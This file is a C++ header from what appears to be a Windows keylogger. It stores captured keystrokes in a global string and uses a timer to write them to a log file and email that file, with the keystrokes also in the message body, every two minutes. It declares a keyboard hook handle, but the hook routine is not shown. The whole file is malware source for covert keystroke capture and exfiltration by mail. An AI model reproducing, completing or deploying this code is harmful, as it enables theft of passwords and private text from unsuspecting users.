#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include <Windows.h>
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = ""; // where store all key strokes are stored

void TimerSendMail()
{
	if (keylog.empty()) // do nothing if keylog is empty
		return;

	std::string last_file = IO::WriteLog(keylog);

	if (last_file.empty()) // if empty, write to debugging log (not successful)
	{
		Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
		return;
	}

	int x = Mail::SendMail("Log [" + last_file + "]", 
		"Hi :) \nThe file has been attached to this mail :)\nFor testing, enjoy!:\n" + keylog,
		IO::GetOurPath(true) + last_file);

	if (x != 7) // if mail was not sent
		Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
	else
		keylog = ""; // if sent clear keylog
}

Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite); // time to send

HHOOK eHook = NULL; // pointer to our hook




#endif // KEYBHOOK_H